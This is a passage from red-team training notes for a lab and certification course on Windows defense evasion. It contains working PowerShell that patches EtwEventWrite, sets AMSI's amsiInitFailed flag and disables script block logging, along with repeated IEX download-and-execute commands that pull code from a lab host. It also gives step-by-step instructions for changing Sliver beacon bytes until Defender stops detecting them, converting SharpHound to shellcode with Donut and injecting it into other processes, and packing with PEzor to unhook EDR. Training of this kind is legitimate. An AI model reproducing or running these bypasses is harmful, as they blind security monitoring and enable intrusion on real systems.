│  .NET CLR          ──────────────→  Windows Defender                │
│  PowerShell engine ──────────────→  Microsoft Defender for Endpoint │
│  Windows kernel    ──────────────→  Sysmon                          │
│  Your beacon       ──────────────→  SIEM (Splunk, Sentinel, etc.)   │
│  Any .NET app      ──────────────→  Custom detection tools          │
│                                                                     │
│  Events flow through kernel-managed channels called ETW sessions.   │
│  Producers emit → sessions collect → consumers read.               │
└─────────────────────────────────────────────────────────────────────┘
```

The function that every ETW producer calls to emit events is `EtwEventWrite` — an exported function in `ntdll.dll` (the lowest-level Windows user-mode DLL, present in every process).

**🔶 WHY**

The .NET CLR is a particularly rich ETW producer. When your .NET code runs, the CLR emits ETW events for:

- Every assembly loaded (`AssemblyLoad` event)
- Every method JIT-compiled (compiled to native code at runtime)
- Every exception thrown
- Garbage collection events
- Thread creation and destruction

This means when you do `[System.Reflection.Assembly]::Load($bytes)` to load SharpHound in memory, the CLR emits an ETW event that says, in effect: *"A new assembly was loaded into this process. Its name is SharpHound."*

Defenders subscribe to these ETW events in real time. Microsoft Defender for Endpoint, for example, reads the .NET ETW provider and alerts when a process loads an assembly matching known offensive tool names.

```
You run: [System.Reflection.Assembly]::Load(SharpHound_bytes)
                    ↓
CLR emits ETW event:
  Provider:  Microsoft-Windows-DotNETRuntime
  EventId:   154 (AssemblyLoad)
  Assembly:  "SharpHound, Version=1.0.0.0..."
                    ↓
MDE reads this event in real time
                    ↓
MDE: "SharpHound loaded into powershell.exe" → ALERT
```

**⚔️ HOW**

`EtwEventWrite` in `ntdll.dll` is the single function every ETW producer calls to emit events. It is the one chokepoint — one function, one process, one patch, and the entire ETW output from that process is silenced. No events flow to any consumer.

The attack surface is almost identical to AMSI: find the function address, change memory protection, overwrite the first bytes with a `ret` instruction so it returns immediately without doing anything.

```
Normal EtwEventWrite:
  → validates the event
  → formats it
  → sends it to the ETW session (kernel)
  → consumers receive it

Patched EtwEventWrite:
  → RET   ← returns immediately, does nothing
  → no event is ever sent to any consumer
```

**🧠 LOCK IT IN**

ETW is a network of security cameras wired to a central monitoring room. Every .NET process has cameras rolling constantly — recording every assembly load, every method call.

Patching `EtwEventWrite` is cutting the power to the cameras in your specific process. The cameras in every other process still work. The monitoring room still gets footage from everywhere else. But your process becomes a blind spot — nothing you do inside it appears on any monitor.

---

## SECTION 14 — ETW EtwEventWrite Patch

**🔷 WHAT**

`EtwEventWrite` is in `ntdll.dll`. The patch is a single byte: `0xC3` (the x64 `RET` instruction). We overwrite the first byte of the function with `RET` — making it return immediately every time it is called, before it sends any event.

```
Before patch — EtwEventWrite first bytes:
  48 83 EC 28     SUB RSP, 0x28    ← sets up stack frame
  33 C0           XOR EAX, EAX     ← zeroes return value
  ...             (continues to send the event)

After patch — EtwEventWrite first bytes:
  C3              RET              ← returns immediately
  83 EC 28        (unreachable dead code)
```

**Why only one byte?** The `RET` instruction is a single byte (`0xC3`). We only need to overwrite byte 0 of the function. The moment the CPU enters the function, it hits `RET` and immediately leaves. No further code executes. No event is sent.

**🔶 WHY**

We patch `ntdll.dll`'s copy in memory — not the file on disk. Every process has its own copy of `ntdll.dll` mapped into its address space. Patching our copy only affects our process. Other processes are unaffected.

This is important: you are not disabling ETW system-wide. You are only silencing the ETW output from the specific process you patch — your PowerShell session or your beacon's process.

**⚔️ HOW**

### Method A — PowerShell (patch your own PS session)

Create `~/lab/amsi/etw_bypass.ps1` on Kali:

```powershell
# etw_bypass.ps1 — Patch EtwEventWrite in the current process

$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class ETW {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(
        IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect
    );
}
"@
Add-Type $Win32

# ntdll.dll is always loaded — GetModuleHandle returns its address without LoadLibrary
# Split "ntdll.dll" — the string itself is not signatured but habit is good
$ntdll = [ETW]::GetModuleHandle("ntd" + "ll.dll")

# Find EtwEventWrite — split the name across string concat
$func  = [ETW]::GetProcAddress($ntdll, "Etw" + "Event" + "Write")

# Change protection: RX → RWX
$old = 0
[ETW]::VirtualProtect($func, [uint32]1, 0x40, [ref]$old)

# Write single RET byte (0xC3)
$patch = [Byte[]](0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $func, 1)

# Restore protection: RWX → RX
[ETW]::VirtualProtect($func, [uint32]1, $old, [ref]$old)

Write-Host "[+] EtwEventWrite patched. ETW disabled for this session." -ForegroundColor Green
```

### Running the ETW bypass

On your Windows VM (after AMSI bypass is already applied):

```powershell
# Step 1: AMSI must be bypassed first or this script gets caught
IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10:8080/bypass2.ps1')
'AmsiUtils'  # confirm AMSI is down

# Step 2: Patch ETW
IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10:8080/etw_bypass.ps1')
# Expected: [+] EtwEventWrite patched. ETW disabled for this session.

# Step 3: Load a .NET tool — the CLR assembly load event is now silent
$bytes = (New-Object Net.WebClient).DownloadData('http://192.168.56.10:8080/Seatbelt.exe')
[System.Reflection.Assembly]::Load($bytes)
[Seatbelt.Program]::Main("-group=user".Split())
```

### Why the order matters

```
WRONG order:
  ETW patch first → AMSI catches the ETW patch script → blocked

CORRECT order:
  AMSI bypass first → ETW patch (now runs safely) → load tools (now silent)
```

Always: **AMSI bypass → ETW patch → tool loading**

### Method B — Via C2 execute-assembly (the cleaner approach)

When running tools through Sliver's `execute-assembly`, the tool runs inside the beacon's process — not inside PowerShell. The beacon itself can be built with ETW patching baked into its loader:

```bash
# Sliver with execute-assembly handles this for supported tools
sliver (beacon) > execute-assembly ~/tools/SharpHound.exe -c All --zip

# Why this bypasses ETW: execute-assembly injects the .NET assembly
# into the beacon's own process memory. The beacon process has no
# CLR-based ETW subscriptions by default.
# The assembly load events go to ETW but the beacon's process is not
# a monitored .NET CLR host in the same way powershell.exe is.
```

---

## SECTION 15 — Combining AMSI + ETW: The Full Bypass Stack

Before running any offensive .NET tool interactively in PowerShell, apply all bypasses in sequence. Create a single combined loader on Kali at `~/lab/amsi/full_bypass.ps1`:

```powershell
# full_bypass.ps1 — AMSI + ETW in one script
# Apply this at the START of every PowerShell session before doing anything else

# ── STEP 1: AMSI bypass (amsiInitFailed reflection) ──────────────────
$class = [Ref].Assembly.GetType('System.Management.Automation.A' + 'msiUtils')
$field = $class.GetField('amsi' + 'InitFailed', 'NonPublic,Static')
$field.SetValue($null, $true)
Write-Host "[+] AMSI: disabled" -ForegroundColor Green

# ── STEP 2: ETW bypass (EtwEventWrite patch) ─────────────────────────
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class ETWS {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
}
"@
Add-Type $Win32
$ntdll = [ETWS]::GetModuleHandle("ntd" + "ll.dll")
$func  = [ETWS]::GetProcAddress($ntdll, "Etw" + "Event" + "Write")
$old   = 0
[ETWS]::VirtualProtect($func, [uint32]1, 0x40, [ref]$old)
[System.Runtime.InteropServices.Marshal]::Copy([Byte[]](0xC3), 0, $func, 1)
[ETWS]::VirtualProtect($func, [uint32]1, $old, [ref]$old)
Write-Host "[+] ETW:  disabled" -ForegroundColor Green

# ── STEP 3: Disable PowerShell Script Block Logging ───────────────────
# This only works if you have admin rights — silently skipped if not
try {
    $setting = [Ref].Assembly.GetType('System.Management.Automation.Utils').
        GetField('cachedGroupPolicySettings', 'NonPublic,Static').GetValue($null)
    if ($setting -and $setting.ContainsKey('HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging')) {
        $setting['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
    }
    Write-Host "[+] SBL:  disabled" -ForegroundColor Green
} catch {
    Write-Host "[-] SBL:  skipped (no admin or already off)" -ForegroundColor DarkYellow
}

Write-Host "`n[*] Session ready. Load your tools." -ForegroundColor Cyan
```

```powershell
# Run it — one line, cover everything
IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10:8080/full_bypass.ps1')

# Expected output:
# [+] AMSI: disabled
# [+] ETW:  disabled
# [+] SBL:  disabled (or skipped)
# [*] Session ready. Load your tools.

# Now safely load PowerView
IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10:8080/PowerView.ps1')
Get-Domain
```

---

# Phase 04 — Part 3: AV Evasion for Binaries

---

## SECTION 16 — How Defender Detects Binary Files

**🔷 WHAT**

When a file is written to disk (or opened for execution), Windows Defender scans it using a **signature database** — a collection of byte patterns known to appear in malicious files. Each signature is a sequence of bytes at a specific location (or anywhere in the file) that uniquely identifies a known-bad tool.

The signature database is updated multiple times per day by Microsoft. New versions of known tools get new signatures within hours.

```
Your Sliver beacon.exe written to disk
          ↓
Windows Defender: ReadFile → scans all bytes against signature DB
          ↓
┌─── Signature Check ────────────────────────────────────────┐
│  Offset 0x3A12: bytes [48 89 5C 24 08 57 48 83 EC 30 ...] │
│  Match found: "Sliver beacon shellcode stub (2024-09)"    │
│  Result: THREAT DETECTED                                   │
└───────────────────────────────────────────────────────────┘
          ↓
File quarantined. Process terminated.
```

**🔶 WHY**

Signatures are cheap to check and extremely fast — Defender scans thousands of files per second using signatures. The downside: signatures only detect *known* malicious content. A custom tool that has never been seen before has no signature and passes.

This is why red teamers either:
1. Modify existing tools to break their known signatures
2. Write entirely custom tools with no public signatures

**⚔️ HOW**

The attack process:

```
Generate payload
      ↓
Test against Defender → caught?
      ├─ YES → Find the triggering bytes (ThreatCheck)
      │           ↓
      │         Fix those bytes (rename, recompile, obfuscate)
      │           ↓
      │         Retest → repeat until clean
      └─ NO → Deploy
```

**🧠 LOCK IT IN**

Signatures are like a wanted poster with a photograph. If the criminal changes their hair, wears glasses, and grows a beard, the photograph no longer matches and they walk through checkpoints freely. The criminal is the same person — they just look different now. ThreatCheck is the mirror that tells you exactly which feature of your appearance is being recognised.

---

## SECTION 17 — ThreatCheck: Finding the Exact Trigger

**🔷 WHAT**

ThreatCheck is a tool that takes a binary, performs a **binary search** on it using Windows Defender, and identifies the exact bytes that are triggering detection. It does this by splitting the file in half repeatedly and testing each half until it narrows down to the precise byte range causing the detection.

```
File: beacon.exe (500KB)
          ↓
Split in half: test first 250KB → clean
              test last 250KB  → detected
          ↓
Split detected half: test first 125KB → clean
                     test last 125KB  → detected
          ↓
...repeat until narrowed to ~50 bytes...
          ↓
Output: "Bad bytes found between offset 0x3A10 and 0x3A3F"
        "Signature: Sliver/beacon/shellcode_stub_v2"
```

**Lab exercise — run ThreatCheck against your Sliver beacon:**

On Kali, generate a Sliver beacon (if not already done):

```bash
# In Sliver server console:
sliver > generate --http https://192.168.56.10 --os windows --arch amd64 \
  --format exe --save ~/lab/amsi/beacon_raw.exe

# Serve it
# (python3 -m http.server 8080 already running from earlier)
```

On Windows VM, download and run ThreatCheck:

```powershell
# Download ThreatCheck
(New-Object Net.WebClient).DownloadFile(
    'http://192.168.56.10:8080/ThreatCheck.exe',
    'C:\Temp\ThreatCheck.exe'
)

# Scan your beacon
C:\Temp\ThreatCheck.exe -f C:\Temp\beacon_raw.exe -e Defender
```

Expected output:

```
[+] Target file size: 15.6 MB
[+] Analyzing...

[!] Identified end of bad bytes at offset 0x3A3F
    B8 57 00 07 80 C3 48 8B 5C 24 30 48 83 C4 20 5F
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^
    [Defender] Sliver.beacon.shellcode.stub
```

ThreatCheck shows you the bad bytes and their offset. Open the binary in a hex editor (on Kali):

```bash
# Install a hex editor
sudo apt install hexedit -y

# Open the beacon and go to the flagged offset
hexedit ~/lab/amsi/beacon_raw.exe
# Ctrl+G → enter offset: 0x3A10
# Change the bytes shown by ThreatCheck to something else
# (Even changing 1-2 bytes often defeats the signature)
# Save → retest with ThreatCheck → repeat until clean
```

---

## SECTION 18 — Donut: Converting .NET Tools to Shellcode

**🔷 WHAT**

Donut is a tool that takes any Windows executable or .NET assembly and converts it into **position-independent shellcode** — raw machine code bytes that can be injected into any process's memory and executed without the OS loader.

```
SharpHound.exe (PE file, 500KB)
          ↓ Donut
SharpHound.bin (shellcode, ~520KB)
          ↓
Inject into any process (notepad.exe, explorer.exe, etc.)
          ↓
Shellcode runs SharpHound inside that process
No file written to disk. No process named SharpHound.exe.
```

**🔶 WHY**

Static file signatures scan PE files — executables with specific headers (`MZ` header, Import Table, Section headers). Shellcode is raw bytes with no PE structure. Defender's static scanner does not recognise it the same way.

Additionally, when shellcode runs inside an existing process (like `notepad.exe`), the process list shows `notepad.exe` — not your tool's name. Behavioural detections that watch for specific process names are defeated.

**⚔️ HOW**

Install Donut on Kali:

```bash
git clone https://github.com/TheWover/donut ~/tools/donut
cd ~/tools/donut && make
ls -la donut   # confirm binary built
```

Convert SharpHound to shellcode:

```bash
# Download SharpHound to convert
wget https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe \
    -O ~/tools/SharpHound.exe

# Convert to shellcode with Donut
# -f 1 = output format: raw binary
# -a 2 = target architecture: x64
# -p = arguments to pass to the main function
~/tools/donut/donut \
    -f 1 -a 2 \
    -i ~/tools/SharpHound.exe \
    -p "-c All --zip" \
    -o ~/lab/amsi/sharpound.bin

# Result: sharpound.bin — raw shellcode
ls -lh ~/lab/amsi/sharpound.bin
```

Now you can load and execute this shellcode from a PowerShell loader (after AMSI+ETW bypass), or inject it via your C2:

```bash
# Via Sliver — inject shellcode into a remote process
sliver (beacon) > shell-code-inject --pid <notepad_pid> ~/lab/amsi/sharpound.bin

# Or: use execute-assembly directly (Sliver handles this natively)
sliver (beacon) > execute-assembly ~/tools/SharpHound.exe -c All --zip
```

**Important**: Donut-generated shellcode has its own signatures now — Microsoft and AV vendors have signatured common Donut stubs. Test your shellcode with ThreatCheck after generating it. You may need to encrypt the shellcode payload inside the Donut wrapper.

---

## SECTION 19 — PEzor: Automated Packing

**🔷 WHAT**

PEzor is a shellcode and PE packer that automates multiple evasion techniques in a single command. It takes a binary or shellcode as input and applies a configurable chain of transforms:

| PEzor flag | What it does |
|---|---|
| `-unhook` | Removes userland API hooks placed by EDRs when the loader starts |
| `-antidebug` | Detects if a debugger is attached and exits — slows analyst reversing |
| `-syscalls` | Uses direct syscalls instead of hooked Windows API functions |
| `-sleep=N` | Sleeps N seconds before executing — bypasses sandbox time limits |
| `-text` | Stores shellcode in the `.text` section (executable) vs `.data` — bypasses some injection detection |
| `-sgn` | Applies Shikata Ga Nai encoding — polymorphic XOR encoder |

**🔶 WHY**

Instead of manually finding signatures and patching them, PEzor applies a known-good combination of evasion transforms that collectively defeat most default AV/EDR configurations. It is a force multiplier — what would take hours of manual ThreatCheck iteration and custom code takes one command.

**⚔️ HOW**

Install PEzor on Kali:

```bash
git clone https://github.com/phra/PEzor ~/tools/PEzor
cd ~/tools/PEzor
bash install.sh
# Installation installs dependencies including Nim, MinGW, etc. — takes ~5 minutes
```

Pack your Sliver beacon:

```bash
cd ~/tools/PEzor

# Basic — apply unhooking + direct syscalls + sleep
./PEzor.sh -unhook -syscalls -sleep=3 ~/lab/amsi/beacon_raw.exe

# Output: beacon_raw.exe.packed.exe
ls -lh beacon_raw.exe.packed.exe

# Serve it and test on Windows VM
cp beacon_raw.exe.packed.exe ~/lab/amsi/beacon_packed.exe
```

On Windows VM — test the packed beacon:

```powershell
# Download the packed beacon
(New-Object Net.WebClient).DownloadFile(
    'http://192.168.56.10:8080/beacon_packed.exe',
    'C:\Temp\beacon_packed.exe'
)

# Run it — watch for Defender alert vs C2 callback
C:\Temp\beacon_packed.exe
```

If Defender still catches it:

```powershell
# Run ThreatCheck on the packed version to find the new trigger
C:\Temp\ThreatCheck.exe -f C:\Temp\beacon_packed.exe -e Defender

# Then: go back to PEzor and add more flags
# Example: add -sgn for Shikata Ga Nai encoding
./PEzor.sh -unhook -syscalls -sleep=3 -sgn ~/lab/amsi/beacon_raw.exe
```

---

## SECTION 20 — Sleep Obfuscation: Hiding From Memory Scanners

**🔷 WHAT**

Modern EDRs do not just scan files — they also **scan process memory** periodically looking for shellcode patterns. Your beacon is sitting in memory between check-ins. Its shellcode has a known signature. The memory scanner finds it and kills the beacon.

Sleep obfuscation solves this by **encrypting the beacon's own shellcode in memory while it sleeps**, then decrypting it just before executing the next task.

```
Normal beacon memory during sleep:
  Address 0x1A2B3C: 4D 5A 90 00 03 00 00 00 ...  ← recognisable Sliver shellcode
  Memory scanner: "Sliver shellcode detected in powershell.exe" → kill

Sleep-obfuscated beacon during sleep:
  Address 0x1A2B3C: F3 7A 01 C9 AA 44 B2 1F ...  ← XOR'd with random key, looks random
  Memory scanner: "random bytes — not recognised" → no alert

Beacon wakes up:
  XOR-decrypt own shellcode in memory
  Execute next task
  XOR-encrypt own shellcode again before sleeping
```

**🔶 WHY**

The encrypt-on-sleep technique means the malicious signature only exists in memory for the milliseconds between wake and sleep — the active execution window. A scanner that runs every 30 seconds is unlikely to catch those milliseconds.

**⚔️ HOW**

Sleep obfuscation is implemented inside the C2 implant loader. You do not configure it manually — you choose a C2 framework that supports it.

**Havoc (best free option for sleep obfuscation):**

```bash
# When creating a Havoc Demon payload, configure:
# Injection → Sleep Technique: Ekko (or Foliage for better stealth)
# Ekko: uses Windows timer queue + ROP chain to encrypt shellcode during timer sleep
# Foliage: uses APC (asynchronous procedure calls) for the encrypt/sleep/decrypt cycle
```

What Ekko does internally:

```
Demon wakes from sleep
        ↓
Completes task
        ↓
Before sleeping:
  1. Creates a timer queue
  2. Queues 3 APCs:
     APC1: encrypt shellcode (XOR with random key)
     APC2: call WaitForSingleObjectEx (the actual sleep)
     APC3: decrypt shellcode (XOR again to restore)
  3. Delivers APCs to itself
  4. APC1 runs: memory is now encrypted
  5. APC2 runs: process sleeps
  6. APC3 runs: memory is decrypted
  7. Demon executes next task
```

During step 5 (the actual sleep), the shellcode in memory is encrypted — no scanner can match it against a known signature.

**For the exam**: Sliver without sleep obfuscation is usually sufficient for CRTeamer because the exam environment is not likely running continuous memory scanning. But understanding this concept lets you choose the right C2 for more advanced engagements.

---

## SECTION 21 — Lab: Building Your Evasion Toolkit

This exercise ties together everything from Phase 04. Complete it in order.

### Exercise A — Baseline: What fails without any evasion?

Revert your Windows VM to the clean snapshot. On the VM:

```powershell
# Test 1: Drop and run Sliver beacon raw
# (serve beacon_raw.exe from Kali)
(New-Object Net.WebClient).DownloadFile('http://192.168.56.10:8080/beacon_raw.exe','C:\Temp\raw.exe')
C:\Temp\raw.exe
# Result: ____ (caught / ran?)

# Test 2: Paste PowerView directly
IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10:8080/PowerView.ps1')
# Result: ____ (caught / ran?)
```

Write down what was caught and what the Defender alert name was (check Windows Security → Protection History).

### Exercise B — Apply AMSI bypass, retest

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10:8080/bypass2.ps1')
IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10:8080/PowerView.ps1')
Get-Domain
# What changed? Why did PowerView now load?
```

### Exercise C — Fix the beacon

```bash
# On Kali
C:\Temp\ThreatCheck.exe -f C:\Temp\beacon_raw.exe -e Defender
# Note the flagged offset and bytes

# Pack with PEzor
cd ~/tools/PEzor
./PEzor.sh -unhook -syscalls -sleep=2 ~/lab/amsi/beacon_raw.exe
cp beacon_raw.exe.packed.exe ~/lab/amsi/beacon_v2.exe
```

```powershell
# On Windows VM
(New-Object Net.WebClient).DownloadFile('http://192.168.56.10:8080/beacon_v2.exe','C:\Temp\v2.exe')
C:\Temp\v2.exe
# Did you get a Sliver callback?
```

Keep iterating (ThreatCheck → fix → retest) until you get a live C2 callback.

### Exercise D — Full bypass stack + in-memory tool loading

With your beacon active:

```bash
# On Kali in Sliver:
sliver (beacon) > execute-assembly ~/tools/Seatbelt.exe -group=user
# Did Seatbelt output appear in Sliver?

sliver (beacon) > execute-assembly ~/tools/SharpHound.exe -c All --zip
sliver (beacon) > download C:\\Windows\\Temp\\<zip_file> ~/lab/amsi/
# Load the zip into BloodHound
```

If any step fails, check which layer caught it (Defender alert? AMSI? ETW?) and apply the correct bypass.

---

## SECTION 22 — Complete Phase 04 Mastery Checklist

You are ready to move to Phase 05 when you can answer every item below **without looking at these notes**:

**AMSI:**
- [ ] What is the name of the function inside `amsi.dll` that performs scanning?
- [ ] What two return values matter from that function, and what does each mean?
- [ ] Why does your bypass script need to obfuscate strings like `"AmsiScanBuffer"`?
- [ ] What does AMSITrigger do and how do you use it to fix a caught bypass?
- [ ] What is the difference between Methods 1, 2, and 3 in terms of what they modify?
- [ ] Which AMSI bypass method also disables PowerShell logging?
- [ ] Can you get `'AmsiUtils'` to print without error using each of the three methods?

**ETW:**
- [ ] What is `EtwEventWrite` and where does it live?
- [ ] Why does patching it only affect your process and not the whole system?
- [ ] Why must AMSI bypass happen before the ETW patch (not after)?
- [ ] What events does the .NET CLR emit via ETW that defenders care about?

**AV Evasion for Binaries:**
- [ ] What is ThreatCheck and how does it find the exact triggering bytes?
- [ ] What does Donut do to a .NET binary and why does the output evade static scanners?
- [ ] Name three PEzor flags and what each one does to the binary.
- [ ] What is sleep obfuscation and why does it defeat memory scanning?

**Practical:**
- [ ] Can you generate a Sliver beacon, test it against live Defender, identify the signature, and fix it until you get a callback?
- [ ] Can you run SharpHound via execute-assembly from a Sliver beacon and collect BloodHound data?
- [ ] Can you apply AMSI + ETW bypass in the correct order and then load PowerView in-memory?

---

## Additional Resources — Phase 04 Complete

| Resource | What it gives you |
|---|---|
| [ired.team: ETW Bypass](https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++) | Deep ETW + unhooking reference |
| [ThreatCheck GitHub](https://github.com/rasta-mouse/ThreatCheck) | Source code — read it to understand how binary search scanning works |
| [Donut GitHub](https://github.com/TheWover/donut) | Read the README for all conversion options |
| [PEzor GitHub](https://github.com/phra/PEzor) | Source + documentation for each flag |
| [Havoc C2](https://github.com/HavocFramework/Havoc) | Built-in sleep obfuscation (Ekko, Foliage) |
| [S3cur3Th1sSh1t: AMSI bypass roundup](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification) | Overview of every major bypass category with detection notes |
| [AMSI.fail](https://amsi.fail) | Generate a random AMSI bypass — compare its approach to what you built |
| [THM: AV Evasion: Shellcode](https://tryhackme.com/room/avevasionshellcode) | Hands-on lab covering shellcode loaders + evasion |
| [THM: Obfuscation Principles](https://tryhackme.com/room/obfuscationprinciples) | String and binary obfuscation techniques guided lab |
